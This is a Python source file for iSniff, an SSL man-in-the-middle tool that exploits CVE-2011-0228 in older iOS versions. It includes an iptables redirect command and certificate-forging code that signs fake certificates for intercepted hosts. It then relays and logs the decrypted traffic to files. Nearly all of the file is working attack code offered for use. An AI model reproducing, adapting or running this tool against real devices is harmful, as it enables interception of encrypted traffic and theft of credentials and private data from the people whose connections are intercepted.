#! /usr/bin/env python

# iSniff.py [initial release 2011-08-03]
#
# SSL man-in-the-middle tool inspired by Moxie Marlinspike's sslsniff 0.8
#
# Successfully tested against iOS < 4.3.5 devices vulnerable to CVE-2011-0228 
# basic constraints validation issue (see http://support.apple.com/kb/HT4824)
# discovered by Gregor Kopf / Paul Kehrer
#
# Written by hubert(a)pentest.com / @hubert3
#
# Redirect SSL traffic from NAT'd clients to iSniff as follows:
#
# iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports 2000
#
# Linux/iptables is currently required for iSniff to determine the intended destination
# of redirected traffic and generate working certs. Other platforms are not supported.
#
# Any certificate trusted by iOS can be used as signing_cert - The example config below
# uses an APNS cert extracted from an iPhone using 'nimble' (tool and cert not included). 
# The certificate chain constructed with this config is similar to the one presented at 
# https://issl.recurity.com. Website certs issued by other trusted CAs such as Verisign, 
# Startcom, Comodo etc. also work.
#
# Tested on Debian GNU/Linux 6.0 (kernel 2.6.32-5-686, Python 2.6.6)
# Packages required: python-m2crypto

import M2Crypto, ssl, SocketServer, socket, struct, random, os.path, sys, time
from SSL_Certificate_CN2 import getCertHostnames
from threading import Thread

signing_cert = 'iphone_device.pem'
signing_cert_key = 'iphone_device.key'

#first ca cert specified below must be issuer of signing_cert (often an intermediate CA cert)
cacerts = ['cacerts/apple_iphone_device_ca.pem','cacerts/apple_iphone_ca.pem','cacerts/apple_root.pem']
add_extra_hostnames = False #add extra subjectAltNames to fake certs generated, e.g. 'google.com' if CN=www.google.com
bind_host = '0.0.0.0'
bind_port = 2000

RemoteHostnames = {}
cacerts.insert(0,signing_cert)
certchain = ''
for ca in cacerts:
	certchain += file(ca).read()

def CreateSignedX509Certificate (ip,hostnames,peername):
	def callback():
		return 'p'
	MBSTRING_FLAG = 0x1000
	MBSTRING_ASC  = MBSTRING_FLAG | 1
	x509req = M2Crypto.X509.Request()
	x509name = M2Crypto.X509.X509_Name()
	x509name.add_entry_by_txt(field='C', type=MBSTRING_ASC, entry='AU', len=-1, loc=-1, set=0)
	x509name.add_entry_by_txt(field='CN', type=MBSTRING_ASC, entry=hostnames[0], len=-1, loc=-1, set=0)
	x509req.set_subject_name(x509name)
	KeyPair = M2Crypto.RSA.gen_key(1024, MBSTRING_ASC, callback)
	PKey = M2Crypto.EVP.PKey(md='sha1')
	PKey.assign_rsa(KeyPair)
	x509req.set_pubkey(pkey=PKey)
	#x509req.sign(pkey=PKey, md='sha1')
	PKey.save_key(file='certs/%s_cert_%s.key' % (ip, peername), cipher=None) #CSR done, save private key
	signingCert = M2Crypto.X509.load_cert(signing_cert)
	newCert = M2Crypto.X509.X509()
	newCert.set_issuer(signingCert.get_subject())
	newCert.set_subject(x509req.get_subject())
	newCert.set_pubkey(x509req.get_pubkey())
	newCert.set_version(1) # this is 3 in moxie's sslsniff 0.8, which my iOS devices always reject
	newCert.set_serial_number(random.randint(1,9999999))
	ASN1 = M2Crypto.ASN1.ASN1_UTCTIME()
	ASN1.set_time(int(time.time()-365*24*60*60))
	newCert.set_not_before(ASN1)
	ASN1.set_time(int(time.time()+365*24*60*60))
	newCert.set_not_after(ASN1)
	if len(hostnames)>1:
		SAN_string = ''
		for hostname in hostnames[1:]:
			SAN_string += 'DNS:%s, ' % hostname
		newCert.add_ext(M2Crypto.X509.new_extension('subjectAltName', SAN_string.strip(', ')))
		#print SAN_string.strip(', ')
	signingKey = M2Crypto.EVP.load_key(signing_cert_key)
	newCert.sign(pkey=signingKey, md='sha1')
	file('certs/%s_cert_%s.pem' % (ip,peername),'w').write(newCert.as_pem()+certchain)

class PipeThread( Thread ):
    pipes = [] #taken from http://code.activestate.com/recipes/114642
    def __init__( self, source, sink, logfile=False):
        Thread.__init__( self )
        self.source = source
        self.sink = sink
        self.logfile = logfile
        PipeThread.pipes.append( self )

    def run( self ):
        while 1:
            try:
                data = self.source.recv( 1024 )
                if not data: break
                if self.logfile:
                	self.logfile.write(data)
                	self.logfile.flush()
                self.sink.send( data )
            except:
                break
        PipeThread.pipes.remove( self )

class SingleTCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
    	SO_ORIGINAL_DST = 80
        # self.request is the client connection/socket
	dst = self.request.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16) # Get the original destination IP before iptables redirect
	_, dst_port, ip1, ip2, ip3, ip4 = struct.unpack("!HHBBBB8x", dst)
	dst_ip = '%s.%s.%s.%s' % (ip1,ip2,ip3,ip4)
	peername = '%s:%s' % (self.request.getpeername()[0], self.request.getpeername()[1])
	print 'Client at %s connecting to %s' % (peername, dst_ip)
	if dst_ip not in RemoteHostnames.keys():
		RemoteHostnames[dst_ip] = getCertHostnames(dst_ip)
		print 'Remote SSL cert hostnames: %s (looked up)' % (RemoteHostnames[dst_ip])
	else:
		print 'Remote SSL cert hostnames: %s (cached)' % (RemoteHostnames[dst_ip])
	CN = RemoteHostnames[dst_ip][0] # SSL_Certificate_CN2 module will return CN as first list element
	if add_extra_hostnames:
		import tldextract
		domain = tldextract.extract(CN).domain
		tld = tldextract.extract(CN).tld
		bonus_hostnames = [] # kludge to work around lack of good support for SNI (server name indication) in python
		bonus_hostnames.append('www.%s.%s' % (domain,tld))
		bonus_hostnames.append('*.%s.%s' % (domain,tld))
		bonus_hostnames.append('%s.%s' % (domain,tld)) # without this, requests to (e.g.) https://google.com fail as the CN is 
		for extra_name in bonus_hostnames:             # www.google.com and there is no subjectAltName 'google.com' in the cert.
			if extra_name not in RemoteHostnames[dst_ip]:
				# however, adding extra hostnames as subjectAltNames makes other certs fail to validate, so disabled by default
				RemoteHostnames[dst_ip].append(extra_name)
	if not (os.path.isfile('certs/%s_cert_%s.pem' % (dst_ip, peername)) and os.path.isfile('certs/%s_cert_%s.key' % (dst_ip, peername))):
		CreateSignedX509Certificate(ip=dst_ip,hostnames=RemoteHostnames[dst_ip],peername=peername)
	ok = False
	try:
		stream_phone = ssl.wrap_socket(self.request, server_side=True,
					     certfile='certs/%s_cert_%s.pem' % (dst_ip, peername),
					     keyfile='certs/%s_cert_%s.key' % (dst_ip, peername),
					     ssl_version=ssl.PROTOCOL_TLSv1)
		ok = True
	except (ssl.SSLError), e:
		print 'SSLError on connection to phone (%s)' % e
		self.finish()
	try:
		server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		stream_server = ssl.wrap_socket(server_sock)
		stream_server.connect((dst_ip, 443))
		if ok:
			if not 'static.' in CN:
				print 'Logging to logs/%s-%s.log' % (CN,peername)
				PipeThread(stream_phone, stream_server, logfile=file('logs/%s-%s.log'% (CN,peername),'a')).start()
			else:
				PipeThread(stream_phone, stream_server).start()
			PipeThread(stream_server, stream_phone).start()
	except (ssl.SSLError), e:
		print 'SSLError on connection to server (%s)' % e
	self.finish()

class SimpleServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    # Ctrl-C will cleanly kill all spawned threads
    daemon_threads = True
    # much faster rebinding
    allow_reuse_address = True

    def __init__(self, server_address, RequestHandlerClass):
        SocketServer.TCPServer.__init__(self, server_address, RequestHandlerClass)

if __name__ == "__main__":
    server = SimpleServer((bind_host, bind_port), SingleTCPHandler)
    # terminate with Ctrl-C
    try:
    	print 'iSniff.py listening on %s:%s' % (bind_host, bind_port)
    	print 'Forward traffic from iPhones / iPads running iOS < 4.3.5 using:'
    	print 'iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports %s' % bind_port
        server.serve_forever()
    except KeyboardInterrupt:
        sys.exit(0)